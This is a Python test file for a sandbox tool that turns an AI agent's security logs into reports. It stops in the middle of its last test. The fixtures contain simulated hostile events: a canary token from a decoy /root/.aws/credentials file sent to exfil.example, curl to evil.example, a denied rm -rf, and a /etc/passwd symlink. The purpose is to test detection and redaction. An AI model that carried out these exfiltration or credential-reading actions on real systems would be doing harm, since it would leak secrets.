"""sandbox-ai report (report.py, pdfdoc.py): one report of runs, sessions or every run - gathered from every log
sandbox-ai keeps (statistics, network with the why of each verdict, the security findings, the appendix), as
Markdown, HTML and PDF with a table of contents and links; no secret in any format; logs read bounded; running and
stopped runs; sessions with their parts; the command."""
import html.parser
import importlib.util
import io
import json
import os
from pathlib import Path
import re
import subprocess
import sys
import zlib

import pytest

ROOT = Path(__file__).resolve().parents[1]


def load(name, path):
    spec = importlib.util.spec_from_file_location(name, ROOT / "sandbox" / path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


R = load("report_under_test", "report.py")
PDF = load("pdfdoc_under_test", "pdfdoc.py")

GITHUB_TOKEN = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
BEARER = "sk-ant-api03-" + "Zx9" * 14
CANARY_TOKEN = "Zq8Xw3Lm9Pv2Rt5Yu7Io"  # a canary token of no known format: known from its state file only
SECRETS = (GITHUB_TOKEN, BEARER, CANARY_TOKEN)
RUN = "claude-1a2b3c4d"
OTHER = "codex-99999999"


@pytest.fixture(autouse=True)
def own_state(tmp_path, monkeypatch):
    for name in ("XDG_STATE_HOME", "XDG_RUNTIME_DIR", "XDG_CONFIG_HOME"):
        (tmp_path / name.lower()).mkdir()
        monkeypatch.setenv(name, str(tmp_path / name.lower()))


def jsonl(path, records):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a") as stream:
        for record in records:
            stream.write(json.dumps(record) + "\n")


def activity(run, kind, summary, when, details=None, session=None, agent="claude"):
    return {"v": 1, "time": when, "run": run, "session": session, "agent": agent, "kind": kind, "summary": summary,
            "details": details or {}, "source": "sandbox-ai", "id": f"{run}-{when}-{kind}"}


def make_logs(directory, run=RUN, session=None, safeguards=True, ended=True):
    """A log directory with every kind of event of RUN (and one of another run that must not be counted)."""
    directory = Path(directory)
    events = [
        activity(run, "session", "claude started", "2026-11-11T10:00:00.000Z",
                 {"event": "start", "agent": "claude", "backend": "podman",
                  "workspaces": [{"host": "/projects/web", "sandbox": "/work"}], "proxy": True}, session),
        activity(run, "prompt", "fix the tests", "2026-11-11T10:00:05.000Z", session=session),
        activity(run, "approval", "allow: connect to 198.51.100.7:443", "2026-11-11T10:01:00.000Z",
                 {"question": "connect to 198.51.100.7:443", "answer": "allow", "scope": "run"}, session),
        activity(run, "approval", "deny: push to github.com", "2026-11-11T10:02:00.000Z",
                 {"question": "push to github.com/acme/web", "answer": "deny", "scope": "once",
                  "reason": "answered"}, session),
        activity(run, "approval", "allow automatically", "2026-11-11T10:02:30.000Z",
                 {"question": "lookup of files.example", "answer": "allow", "automatic": True}, session),
        activity(run, "file", "modified /work/a.py", "2026-11-11T10:03:00.000Z", {"action": "modified"}, session),
        activity(OTHER, "session", "codex started", "2026-11-11T09:00:00.000Z", {"event": "start", "agent": "codex"}),
        activity(OTHER, "approval", "deny: other run", "2026-11-11T09:01:00.000Z",
                 {"question": "OTHER RUN QUESTION", "answer": "deny"}),
    ]
    if ended:
        events.append(activity(run, "session", "claude ended", "2026-11-11T11:00:00.000Z",
                               {"event": "stop", "status": 0, "duration_s": 3600.0}, session))
    jsonl(directory / "activity.jsonl", events)
    process = {"comm": "curl", "pid": 4242, "ns_pid": 42, "argv": ["curl", "https://evil.example"]}
    jsonl(directory / f"connections-20261111-100000-{run}.jsonl", [
        {"time": "2026-11-11T10:00:10Z", "connection": 1, "destination": "160.79.104.10:443", "host": "api.anthropic.com",
         "event": "http", "method": "POST", "url": "https://api.anthropic.com/v1/messages", "status": 200,
         "bytes_out": 1000, "bytes_in": 5000, "model": {"model": "claude-x", "usage": {"input_tokens": 10,
                                                                                         "output_tokens": 20}},
         "credentials": ["x-api-key"]},
        {"time": "2026-11-11T10:01:01Z", "connection": 2, "destination": "198.51.100.7:443", "host": "files.example",
         "event": "http", "method": "GET", "url": "https://files.example/a", "status": 200, "bytes_out": 100,
         "bytes_in": 200, "approval": {"decision": "allow", "scope": "run", "reason": "answered"}},
        {"time": "2026-11-11T10:04:00Z", "connection": 3, "destination": "192.0.2.66:443", "host": "evil.example",
         "event": "denied", "reason": "not allowed by the network options", "process": process},
        {"time": "2026-11-11T10:04:01Z", "connection": 4, "destination": "192.0.2.66:443", "host": "evil.example",
         "event": "denied", "reason": "not allowed by the network options", "process": process},
        {"time": "2026-11-11T10:05:00Z", "connection": 5, "destination": "192.0.2.80:443", "host": "pinned.example",
         "event": "tls-refused", "error": "tlsv1 alert unknown ca", "process": {"comm": "node", "pid": 77}},
        {"time": "2026-11-11T10:05:30Z", "connection": 6, "destination": "192.0.2.81:443", "host": "badcert.example",
         "event": "tls-upstream-failed", "error": "certificate verify failed"},
        {"time": "2026-11-11T10:06:00Z", "connection": 7, "destination": "140.82.112.3:443", "host": "github.com",
         "event": "http", "method": "POST", "url": "https://github.com/acme/web.git/git-receive-pack",
         "push": {"ok": False, "message": "a private key in config/id_rsa", "refs": ["refs/heads/main"],
                  "findings": [{"rule": "private-key"}]}, "process": {"comm": "git", "pid": 90}},
        {"time": "2026-11-11T10:06:30Z", "connection": 8, "destination": "140.82.112.3:443", "host": "github.com",
         "event": "http", "method": "POST", "url": "https://github.com/acme/web.git/git-receive-pack",
         "push": {"ok": True, "refs": ["refs/heads/feature"]}, "bytes_out": 3000, "bytes_in": 300},
        {"time": "2026-11-11T10:07:00Z", "connection": 9, "destination": "192.0.2.90:443", "host": "api.example",
         "event": "denied", "method": "DELETE", "url": f"https://api.example/items?access_token={GITHUB_TOKEN}",
         "rule": "no-delete", "ruleset": "rules", "reason": f"DELETE is denied by rule no-delete; Authorization: Bearer {BEARER}"},
        {"time": "2026-11-11T10:08:00Z", "event": "taint", "taint": {"tainted": True, "since": "2026-11-11T10:08:00Z",
                                                                      "source": {"what": "docs.example", "rule": "web",
                                                                                 "ruleset": "rules"}}},
        {"time": "2026-11-11T10:09:00Z", "event": "untaint", "by": "you", "was": {"tainted": True}},
        {"time": "2026-11-11T10:10:00Z", "connection": 10, "destination": "198.51.100.7:443", "host": "files.example",
         "event": "cut", "reason": "cut by the kill switch (all: everything is cut, its model API too); sandbox-ai net "
                                   "cut RUN off lifts it"},
        {"time": "2026-11-11T10:10:05Z", "connection": 11, "destination": "160.79.104.10:443",
         "host": "api.anthropic.com", "event": "denied",
         "reason": "cut by the kill switch (all: everything is cut, its model API too); sandbox-ai net cut RUN off "
                   "lifts it"},
    ])
    jsonl(directory / f"connections-20261111-090000-{OTHER}.jsonl", [
        {"time": "2026-11-11T09:00:10Z", "connection": 1, "destination": "192.0.2.200:443", "host": "other-run.example",
         "event": "denied", "reason": "not allowed by the network options"}])
    jsonl(directory / "egress-denied.jsonl", [
        {"time": "2026-11-11T10:11:00Z", "address": "203.0.113.9", "protocol": "udp", "port": 53,
         "process": {"comm": "dig", "pid": 55}, "sandbox": {"run": run}},
        {"time": "2026-11-11T10:11:30Z", "host": "exfil.example", "reason": "not in allowed hosts",
         "process": {"comm": "python3", "pid": 56}},
    ])
    jsonl(directory / "dns.jsonl", [{"time": "2026-11-11T10:12:00Z", "host": "pypi.org", "forwarded": "10.0.0.53"}])
    jsonl(directory / "canaries.jsonl", [
        {"time": "2026-11-11T10:13:00Z", "run": run, "event": "read", "canary": "c1", "category": "credentials",
         "path": "/root/.aws/credentials", "action": "report", "process": {"comm": "cat", "pid": 60},
         "summary": "something in the sandbox opened the decoy file /root/.aws/credentials (AWS keys)"},
        {"time": "2026-11-11T10:14:00Z", "run": run, "event": "send", "canary": "c1", "source": "proxy",
         "where": "header", "url": f"https://exfil.example/?k={CANARY_TOKEN}", "action": "stop",
         "summary": f"a token of the decoy file /root/.aws/credentials left the sandbox in a request to "
                    f"https://exfil.example/?k={CANARY_TOKEN} (header, plain)"},
    ])
    jsonl(directory / "vpn.jsonl", [
        {"time": "2026-11-11T10:00:01Z", "run": run, "profile": "office", "type": "wireguard", "failures": [],
         "warnings": [], "notes": []},
        {"time": "2026-11-11T10:30:00Z", "run": run, "profile": "office", "type": "wireguard", "recheck": True,
         "failures": ["IPv4: the internet sees this host's own address 198.51.100.200: traffic leaves past the VPN"],
         "leaks": ["IPv4: the internet sees this host's own address 198.51.100.200: traffic leaves past the VPN"],
         "warnings": ["IPv6: unknown"]},
    ])
    jsonl(directory / "tools.jsonl", [
        {"time": "2026-11-11T10:15:00Z", "agent": "claude", "tool": "Bash", "decision": "deny", "rule": "no-rm",
         "ruleset": "rules", "reason": "rm -rf is denied by rule no-rm"}])
    jsonl(directory / "mcp-calls.jsonl", [
        {"time": "2026-11-11T10:16:00Z", "server": "fetch", "event": "call", "tool": "get", "arguments": "{}"},
        {"time": "2026-11-11T10:16:30Z", "server": "fetch", "event": "call", "tool": "post", "arguments": "{}",
         "decision": "ask", "rule": "ask-post", "ruleset": "rules",
         "approval": {"decision": "deny", "scope": "once", "reason": "answered"}, "reason": "not approved"}])
    jsonl(directory / "devices.jsonl", [
        {"time": "2026-11-11T10:17:00Z", "run": run, "event": "refuse", "value": "/dev/ttyUSB0",
         "reason": "not a character device"}])
    jsonl(directory / "workspaces.jsonl", [
        {"time": "2026-11-11T10:18:00Z", "run": run, "event": "add", "host": "/projects/docs", "sandbox": "/docs",
         "mode": "ro"}])
    jsonl(directory / "files.jsonl", [{"time": "2026-11-11T10:19:00Z", "action": "write", "path": "/work/a.py"}])
    jsonl(directory / "processes.jsonl", [{"time": "2026-11-11T10:19:30Z", "pid": 3, "ppid": 1,
                                           "command": "/usr/bin/python3 -m pytest"}])
    if safeguards:
        jsonl(directory / "safeguards.jsonl", [
            {"v": 1, "time": "2026-11-11T10:20:00Z", "run": run, "kind": "policy", "level": "warning",
             "what": "sandbox-ai net allow --egress-all-allow", "why": "not allowed by the administrator's policy",
             "fix": "it stays refused", "stays": True, "count": 1, "source": "supervisor", "id": "p1"},
            {"v": 1, "time": "2026-11-11T10:20:30Z", "run": run, "kind": "mode", "level": "warning",
             "what": "sandbox-ai net allow --allow-host x.example", "why": "the security mode strict refuses it",
             "fix": "start again with --mode medium", "stays": False, "count": 1, "source": "supervisor", "id": "m1"},
            {"v": 1, "time": "2026-11-11T10:21:00Z", "run": run, "kind": "guard", "level": "error",
             "what": "the tool hook", "why": "not a hook of a known agent", "fix": "it stays refused", "stays": True,
             "count": 1, "source": "tool", "id": "g1"},
            {"v": 1, "time": "2026-11-11T10:04:00Z", "run": run, "kind": "network", "level": "warning",
             "what": "connection to 192.0.2.66:443", "why": "not allowed by the network options",
             "fix": f"sandbox-ai net allow {run} --allow-host evil.example", "stays": False, "count": 1,
             "process": "curl (pid 42): curl https://evil.example", "source": "proxy", "id": "n1"},
            {"v": 1, "time": "2026-11-11T09:30:00Z", "run": OTHER, "kind": "guard", "level": "error",
             "what": "OTHER RUN GUARD", "why": "x", "fix": "y", "stays": True, "count": 1, "id": "o1"},
        ])
    return directory


def found(data, kind):
    return [f for f in data["findings"] if f["kind"] == kind]


# -- gathering --------------------------------------------------------------------------------------------------

def test_every_kind_of_event_is_gathered_for_its_run_only(tmp_path):
    logs = make_logs(tmp_path / "logs", safeguards=False)
    scope = R.resolve(log_dir=logs)
    scope["dirs"][str(logs)]["runs"] = {RUN}  # the run alone, as `report RUN` reads it
    data = R.gather(scope, live=False)
    run = next(r for r in data["runs"] if r["run"] == RUN)
    assert run["agent"] == "claude" and run["backend"] == "podman" and run["status"] == 0
    assert run["duration_s"] == 3600.0 and run["workspaces"][0]["host"] == "/projects/web"
    assert run["vpn"]["profile"] == "office" and run["workspace_changes"][0]["host"] == "/projects/docs"
    assert OTHER not in {r["run"] for r in data["runs"]}
    totals = data["totals"]
    assert totals["requests"] == 4 and totals["refused"] >= 5 and totals["bytes_in"] == 5500
    targets = {d["target"]: d for d in data["destinations"]}
    assert "other-run.example" not in targets
    assert targets["evil.example"]["verdict"] == "refused" and "curl (pid 42)" in targets["evil.example"]["processes"]
    assert any("not allowed by the network options" in why for why in targets["evil.example"]["why_refused"])
    assert any(why.startswith("you approved it (run)") for why in targets["files.example"]["why_allowed"])
    assert any("model API of claude" in why for why in targets["api.anthropic.com"]["why_allowed"])
    assert targets["203.0.113.9:53"]["refused"] == 1  # the firewall's drop
    lookups = {e["name"]: e for e in data["lookups"]}
    assert lookups["exfil.example"]["refused"] == 1 and lookups["exfil.example"]["processes"] == ["python3 (pid 56)"]
    assert lookups["pypi.org"]["forwarded"] == 1
    approvals = data["approvals"]
    assert (approvals["asked"], approvals["allowed"], approvals["denied"], approvals["automatic"]) == (3, 2, 1, 1)
    assert data["mcp"]["fetch"]["calls"] == 2 and data["mcp"]["fetch"]["refused"] == 1
    assert data["pushes"]["checked"] == 1 and data["pushes"]["refused"] == 1
    assert data["models"] == {"claude-x": 1} and data["tokens"]["output_tokens"] == 20
    assert data["processes"] == 1 and data["files"] == {"write": 1}
    kinds = {f["kind"] for f in data["findings"]}
    # Without safeguards.jsonl the findings come from the logs themselves (safeguards.py's own converters).
    assert {"canary", "vpn", "push", "rule", "taint", "untaint", "killswitch", "tls", "network", "firewall", "dns",
            "device", "approval-denied"} <= kinds, kinds
    assert data["findings"][0]["severity"] == "critical"
    # Where a canary token went is said without the URL's path and query, even when the run's canary state is gone.
    assert CANARY_TOKEN not in json.dumps(found(data, "canary")) and "https://exfil.example/…" in json.dumps(data, ensure_ascii=False)
    critical = [f for f in data["findings"] if f["severity"] == "critical"]
    assert {f["kind"] for f in critical} == {"canary", "vpn"}
    assert [f["id"] for f in data["findings"]] == [f"F{i}" for i in range(1, len(data["findings"]) + 1)]
    network = [f for f in found(data, "network") if "192.0.2.66" in f["what"]]
    assert network[0]["count"] == 2 and network[0]["by"][0].startswith("curl")
    assert all("OTHER RUN" not in json.dumps(f) for f in data["findings"])
    cut = found(data, "killswitch")
    assert any("closed" in f["what"] for f in cut) and all("net cut" in f["fix"] for f in cut)
    assert any(s["path"].endswith("canaries.jsonl") for s in data["sources"])


def test_a_runs_safeguards_record_is_used_where_it_has_one(tmp_path):
    logs = make_logs(tmp_path / "logs", safeguards=True)
    scope = R.resolve(log_dir=logs)
    scope["dirs"][str(logs)]["runs"] = {RUN}
    data = R.gather(scope, live=False)
    kinds = {f["kind"] for f in data["findings"]}
    assert {"policy", "mode", "guard", "network", "canary", "vpn", "killswitch", "approval-denied"} <= kinds
    assert "OTHER RUN GUARD" not in json.dumps(data)
    guard = found(data, "guard")[0]
    assert guard["severity"] == "high" and guard["fix"] == "it stays refused"
    # The recorded network refusal is not counted twice with the connection log's own.
    assert len([f for f in found(data, "network") if "192.0.2.66" in f["what"]]) == 1


def test_since_and_until_narrow_everything(tmp_path):
    logs = make_logs(tmp_path / "logs")
    scope = R.resolve(log_dir=logs)
    activity_module = R.module("activity")
    data = R.gather(scope, since=activity_module.epoch("2026-11-11T10:10:00Z"),
                    until=activity_module.epoch("2026-11-11T10:14:30Z"), live=False)
    whens = [R.epoch(f["first"]) for f in data["findings"] if f["first"]]
    assert whens and min(whens) >= R.epoch("2026-11-11T10:10:00Z") and max(whens) <= R.epoch("2026-11-11T10:14:30Z")
    assert data["approvals"]["asked"] == 0 and data["period"]["since"].startswith("2026-11-11 10:10")


# -- the formats --------------------------------------------------------------------------------------------------

@pytest.fixture
def report_data(tmp_path):
    logs = make_logs(tmp_path / "logs")
    canaries = tmp_path / "xdg_state_home" / "sandbox-ai" / "canaries" / "runs"
    canaries.mkdir(parents=True)
    (canaries / f"{RUN}.json").write_text(json.dumps({"run": RUN, "canaries": [{"id": "c1",
                                                                                 "tokens": {"key": CANARY_TOKEN}}]}))
    scope = R.resolve(log_dir=logs)
    return R.gather(scope, live=False)


def test_markdown_has_a_toc_and_every_link_resolves(report_data):
    text = R.render(report_data, "md")
    anchors = set(re.findall(r'<a id="([^"]+)"></a>', text))
    links = re.findall(r"\]\(#([^)]+)\)", text)
    assert links and set(links) <= anchors
    for section in ("Summary", "Runs", "Statistics", "Network", "Security report", "Appendix"):
        assert re.search(rf"^- \[{re.escape(section)}\]\(#", text, re.M), section
        assert re.search(rf"^# {re.escape(section)}$", text, re.M), section
    # The summary links to every finding.
    for finding in report_data["findings"]:
        assert f"[{finding['id']}](#" in text
    assert "sandbox-ai " + report_data["version"] in text and "Generated " in text


class Ids(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.ids, self.links, self.external = set(), [], []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if attrs.get("id"):
            self.ids.add(attrs["id"])
        if tag == "a" and attrs.get("href"):
            (self.links if attrs["href"].startswith("#") else self.external).append(attrs["href"])
        if tag in ("script", "link", "img", "iframe"):
            self.external.append(tag)


def test_html_is_self_contained_and_its_toc_resolves(report_data):
    text = R.render(report_data, "html")
    parser = Ids()
    parser.feed(text)
    assert parser.links and {link[1:] for link in parser.links} <= parser.ids
    assert parser.external == []  # nothing loaded from anywhere: inline CSS only
    assert '<nav class="toc">' in text and "prefers-color-scheme: dark" in text and "@media print" in text
    assert text.startswith("<!DOCTYPE html>")


def pdf_objects(data):
    """{number: (dictionary bytes, stream bytes or None)} of a PDF, checked against its xref table."""
    match = re.search(rb"startxref\s+(\d+)\s+%%EOF\s*$", data)
    assert match, "no startxref"
    xref = int(match.group(1))
    assert data[xref:xref + 4] == b"xref"
    head = re.match(rb"xref\s+0\s+(\d+)\s+", data[xref:])
    count = int(head.group(1))
    entries = data[xref + head.end():].split(b"\n")[:count]
    objects = {}
    for number, entry in enumerate(entries):
        offset, _, kind = entry.split()[:3]
        if kind != b"n":
            continue
        offset = int(offset)
        assert data[offset:].startswith(b"%d 0 obj" % number), number
        end = data.index(b"endobj", offset)
        body = data[offset:end]
        stream = None
        if b"stream\n" in body:
            dictionary, rest = body.split(b"stream\n", 1)
            length = int(re.search(rb"/Length (\d+)", dictionary).group(1))
            stream = rest[:length]
            if b"/FlateDecode" in dictionary:
                stream = zlib.decompress(stream)
            body = dictionary
        objects[number] = (body, stream)
    trailer = data[data.rindex(b"trailer"):]
    assert int(re.search(rb"/Size (\d+)", trailer).group(1)) == count
    return objects


def test_the_pdf_parses_with_outline_and_links(report_data):
    data = R.render(report_data, "pdf")
    assert data.startswith(b"%PDF-1.4") and data.rstrip().endswith(b"%%EOF")
    objects = pdf_objects(data)
    catalog = next(body for body, _ in objects.values() if b"/Type /Catalog" in body)
    assert b"/Outlines" in catalog and b"/PageMode /UseOutlines" in catalog
    pages = [n for n, (body, _) in objects.items() if b"/Type /Page " in body or body.rstrip().endswith(b"/Type /Page")
             or b"/Type /Page /" in body]
    assert len(pages) >= 2
    titles = []
    for body, _ in objects.values():
        match = re.search(rb"/Title <feff([0-9a-f]*)>", body)
        if match and b"/Parent" in body:
            titles.append(bytes.fromhex(match.group(1).decode()).decode("utf-16-be"))
    for section in ("Summary", "Runs", "Statistics", "Network", "Security report", "Appendix"):
        assert section in titles
    assert any(title.startswith("F1 · ") for title in titles)  # each finding is a bookmark
    links = [body for body, _ in objects.values() if b"/Subtype /Link" in body]
    assert len(links) >= len(report_data["findings"]) + 6  # the contents and the summary's link to each finding
    for body in links + [body for body, _ in objects.values() if b"/Parent" in body and b"/Dest" in body]:
        page = int(re.search(rb"/Dest \[(\d+) 0 R /XYZ", body).group(1))
        assert page in pages
    text = b"".join(stream for _, stream in objects.values() if stream)
    assert b"(Security report)" in text and b"Tj" in text


def test_no_secret_appears_in_any_format(report_data):
    outputs = [json.dumps(report_data), R.render(report_data, "md"), R.render(report_data, "html")]
    pdf = R.render(report_data, "pdf")
    outputs.append(b"".join(stream or b"" for _, stream in pdf_objects(pdf).values()).decode("latin-1"))
    outputs.append(pdf.decode("latin-1"))
    for output in outputs:
        for secret in SECRETS:
            assert secret not in output
    assert "exfil.example" in outputs[1]  # what the canary's token went to is still named


def test_pdf_writer_alone_wraps_breaks_pages_and_links():
    blocks = [("heading", 1, "One", "one"), ("toc", [(1, "One", "one"), (1, "Two", "two")]),
              ("para", [("t", "word " * 3000)]),
              ("table", ["A", "B"], [[[("t", "x" * 400)], [("l", "to two", "two")]] for _ in range(60)]),
              ("heading", 1, "Two", "two"), ("para", [("t", "Ünïcödé € — ✓ 漢字")])]
    data = PDF.render(blocks, title="Test", outline=[(1, "One", "one"), (1, "Two", "two"), (1, "Gone", "nowhere")])
    objects = pdf_objects(data)
    assert sum(1 for body, _ in objects.values() if b"/Type /Page " in body) > 3
    titles = [body for body, _ in objects.values() if b"/Parent" in body and b"/Title" in body]
    assert len(titles) == 2  # an outline entry without its heading is left out
    content = b"".join(stream for _, stream in objects.values() if stream)
    assert b"page 1 of" in content and b"\x80" in content  # the euro sign in WinAnsi; what it lacks is "?"
    for _, stream in objects.values():
        if stream:
            assert stream.count(b"BT") == stream.count(b"ET")


# -- bounded reading --------------------------------------------------------------------------------------------

def test_a_huge_log_is_not_read_whole(tmp_path, monkeypatch):
    logs = make_logs(tmp_path / "logs")
    big = logs / f"connections-20261111-120000-{RUN}.jsonl"
    line = json.dumps({"time": "2026-11-11T12:00:00Z", "event": "http", "host": "bulk.example", "method": "GET",
                       "url": "https://bulk.example/" + "x" * 200, "connection": 1}) + "\n"
    with open(big, "w") as stream:
        stream.write(line * 20000)  # about 5 MiB
    size = big.stat().st_size
    reads = []
    original = R.module("logs").iter_lines

    def counting(path, budget=None, tail=None, line_bytes=None):
        before = budget["read_bytes"] + budget["skipped_bytes"]
        yield from original(path, budget, tail, line_bytes)
        reads.append((Path(path).name, budget["read_bytes"] - (before - budget["skipped_bytes"])))
    monkeypatch.setattr(R.module("logs"), "iter_lines", counting)
    sources = R.Sources(tail=256 << 10, total=1 << 20)
    data = R.gather(R.resolve(log_dir=logs), sources=sources, live=False)
    entry = next(s for s in data["sources"] if s["path"] == str(big))
    assert entry["read"] <= (256 << 10) + len(line) and entry["skipped"] >= size - (256 << 10)
    assert entry["older_lines"] > 1000
    assert sum(s["read"] for s in data["sources"]) <= (1 << 20) + 4096
    assert any("older log lines were not read" in note for note in data["notes"])
    assert "Not read (older)" in R.render(data, "html")


def test_an_unreadable_log_is_named_in_the_appendix(tmp_path):
    logs = make_logs(tmp_path / "logs")
    (logs / "dns.jsonl").unlink()
    os.symlink("/etc/passwd", logs / "dns.jsonl")
    data = R.gather(R.resolve(log_dir=logs), live=False)
    assert any(u["path"].endswith("dns.jsonl") and "not a regular file" in u["why"] for u in data["unreadable"])
    assert "root:" not in json.dumps(data)


# -- running and stopped runs, sessions -------------------------------------------------------------------------

def register(tmp_path, run, log_dir, **fields):
    runs = Path(os.environ["XDG_RUNTIME_DIR"]) / "sandbox-ai" / "runs" / run
    runs.mkdir(parents=True)
    record = {"run": run, "agent": "claude", "backend": "podman", "workspace": "/projects/web", "pid": os.getpid(),
              "started": "2026-11-11T10:00:00Z", "log_dir": str(log_dir), "mode": {"name": "strict"}, "ask": "on",
              "vpn_profile": "office", "vpn_type": "wireguard", "net_cut": 1, "name": "web-run", **fields}
    (runs / "run.json").write_text(json.dumps(record))
    return runs


def test_a_running_run_by_its_name_with_its_kill_switch(tmp_path):
    logs = make_logs(tmp_path / "logs", ended=False)
    directory = register(tmp_path, RUN, logs)
    (directory / "cut.json").write_text(json.dumps({"mode": "remote", "since": "2026-11-11T10:40:00Z"}))
    (directory / "names.json").write_text(json.dumps({"github.com": {"addresses": ["140.82.112.3"]}}))
    scope = R.resolve("web-run")
    assert set(scope["runs"]) == {RUN} and scope["runs"][RUN]["state"] == "running"
    data = R.gather(scope)  # live: the supervisor does not answer here, which the report says
    run = data["runs"][0]
    assert run["cut"] == "remote" and run["mode"] == "strict" and run["vpn"]["type"] == "wireguard"
    assert run["live"]["hosts"] == ["github.com"] and run["ended"] is None and run["duration_s"] > 0
    assert any("did not say what was allowed" in note for note in data["notes"])
    holds = [f for f in found(data, "killswitch") if f["what"].startswith("the kill switch holds")]
    assert holds and holds[0]["severity"] == "info"
    targets = {d["target"]: d for d in data["destinations"]}
    assert any("during the run" in why for why in targets["github.com"]["why_allowed"])
    assert any(why.startswith("you approved it") for why in targets["files.example"]["why_allowed"])
    text = R.render(data, "md")
    assert "remote since 2026-11-11T10:40:00Z" in text and "running" in text


def test_a_stopped_run_by_its_id_is_found_in_the_default_log_directories(tmp_path):
    logs = make_logs(Path(os.environ["XDG_STATE_HOME"]) / "sandbox-ai" / "logs" / "web-0123456789ab")
    scope = R.resolve(RUN)
    assert set(scope["runs"]) == {RUN}
    data = R.gather(scope, live=False)
    run = data["runs"][0]
    assert run["state"] == "ended" and run["ended"] == "2026-11-11T11:00:00.000Z" and run["status"] == 0
    assert "OTHER RUN QUESTION" not in json.dumps(data)
    with pytest.raises(ValueError, match="no run or start named"):
        R.resolve("nothing-like-this")
    assert str(logs) in {s["path"].rsplit("/", 1)[0] for s in data["sources"]}
    # Several names: one report of all of them (each read once).
    both = R.gather(R.resolve([RUN, OTHER, RUN]), live=False)
    assert {r["run"] for r in both["runs"]} == {RUN, OTHER} and "OTHER RUN GUARD" in json.dumps(both)
    assert len(both["sources"]) == len({s["path"] for s in both["sources"]})
    with pytest.raises(ValueError, match="no run or start named"):
        R.resolve([RUN, "nothing-like-this"])


def test_a_session_with_all_its_runs_and_parts(tmp_path, monkeypatch):
    sessions = R.module("sessions")
    logs = tmp_path / "logs"
    make_logs(logs, run="claude-00000001", session="web")
    make_logs(logs, run="claude-00000002", session="web", safeguards=False)
    directory = sessions.root() / "web"
    project = tmp_path / "project"
    project.mkdir()
    directory.mkdir(parents=True)
    sessions.save("web", {"agent": "claude", "options": ["--log-dir", str(logs), "--allow-pypi", "--env",
                                                         f"GH_TOKEN={GITHUB_TOKEN}", "--mode", "medium"],
                          "cwd": str(project), "name": "frontend", "run": "claude-00000002", "mode": "foreground"})
    entries = [{"name": "frontend", "id": "web", "kind": "session", "agent": "claude", "state": "stopped",
                "run": None, "workspace": "/projects/web", "mcp": ["fetch"], "listed_under": None},
               {"name": "mcp-fetch", "id": "mcp-fetch", "kind": "mcp", "state": "stopped", "run": None,
                "listed_under": "frontend"},
               {"name": "other", "id": "other", "kind": "session", "state": "stopped", "listed_under": None}]
    monkeypatch.setattr(R, "start_entries", lambda: entries)
    server = Path(os.environ["XDG_STATE_HOME"]) / "sandbox-ai" / "mcp" / "fetch"
    jsonl(server / "mcp-calls.jsonl", [{"time": "2026-11-11T10:40:00Z", "event": "call", "tool": "head",
                                        "arguments": "{}"}])
    scope = R.resolve(session="frontend")
    data = R.gather(scope, live=False)
    runs = {r["run"]: r for r in data["runs"]}
    assert {"claude-00000001", "claude-00000002", "mcp-fetch"} <= set(runs)
    assert runs["claude-00000001"]["name"] == "frontend" and runs["mcp-fetch"]["role"] == "MCP server"
    assert runs["mcp-fetch"]["part_of"] == "frontend"
    assert runs["claude-00000002"]["settings"]["mode"] == "medium"
    assert "pypi" in runs["claude-00000002"]["settings"]["presets"]
    options = " ".join(runs["claude-00000002"]["options"])
    assert "GH_TOKEN=[redacted]" in options and GITHUB_TOKEN not in json.dumps(data)
    assert data["mcp"]["fetch"]["tools"].get("head") == 1
    assert OTHER not in runs
    # Both runs' findings, each counted for its own run.
    assert {f["run"] for f in found(data, "canary")} == {"claude-00000001", "claude-00000002"}
    alone = R.gather(R.resolve("frontend", parts=False), live=False)
    assert "mcp-fetch" not in {r["run"] for r in alone["runs"]}
    with pytest.raises(ValueError, match="no session named"):
        R.resolve(session="nope")


# -- the command ------------------------------------------------------------------------------------------------

def run_cli(args, monkeypatch):
    out, err = io.StringIO(), io.StringIO()
    status = R.cli(args, out, err)
    return status, out.getvalue(), err.getvalue()


def test_the_command_writes_each_format(tmp_path, monkeypatch):
    logs = make_logs(tmp_path / "logs")
    status, text, _ = run_cli(["--log-dir", str(logs)], monkeypatch)
    assert status == 0 and text.startswith("<a id=") and "# Security report" in text
    for suffix, start in ((".md", b"<a id="), (".html", b"<!DOCTYPE html>"), (".pdf", b"%PDF-1.4")):
        target = tmp_path / f"out{suffix}"
        status, _, said = run_cli(["--log-dir", str(logs), "-o", str(target)], monkeypatch)
        assert status == 0 and target.read_bytes().startswith(start) and "written to" in said
        assert target.stat().st_mode & 0o777 == 0o600
    status, text, _ = run_cli(["--log-dir", str(logs), "--json", "--since", "2026-11-11T10:20:00Z"], monkeypatch)
    assert json.loads(text)["period"]["since"].startswith("2026-11-11 10:20")
    with pytest.raises(ValueError, match="not both"):
        R.cli(["x", "--all"], io.StringIO(), io.StringIO())
    with pytest.raises(ValueError, match="--until is before --since"):
        R.cli(["--log-dir", str(logs), "--since", "2026-11-11T10:00:00Z", "--until", "2026-11-10T10:00:00Z"],
              io.StringIO(), io.StringIO())


def test_the_command_through_sandbox_ai(tmp_path):
    logs = make_logs(tmp_path / "logs")
    env = {**os.environ}
    result = subprocess.run([sys.executable, "-I", str(ROOT / "sandbox" / "main.py"), "report", "--log-dir", str(logs),
                             "-f", "html"], capture_output=True, text=True, env=env, timeout=120)
    assert result.returncode == 0, result.stderr
    assert result.stdout.startswith("<!DOCTYPE html>")
    result = subprocess.run([sys.executable, "-I", str(ROOT / "sandbox" / "main.py"), "report", "nothing-here"],
                            capture_output=True, text=True, env=env, timeout=120)
    assert result.returncode == 1 and "no run or start named nothing-here" in result.stderr
    main = load("main_for_report_test", "main.py")
    assert main.PYTHON_COMMANDS["report"] == ("report.py",) and "sandbox-ai report" in main.__doc__
    help_text = subprocess.run([sys.executable, "-I", str(ROOT / "sandbox" / "main.py"), "report", "--help"],
                               capture_output=True, text=True, env=env, timeout=120).stdout
    assert help_text.startswith("usage: sandbox-ai report ") and "--format" in help_text


def test_every_text_of_the_logs_is_shown_escaped(tmp_path):
    logs = tmp_path / "logs"
    jsonl(logs / f"connections-20261111-100000-{RUN}.jsonl", [
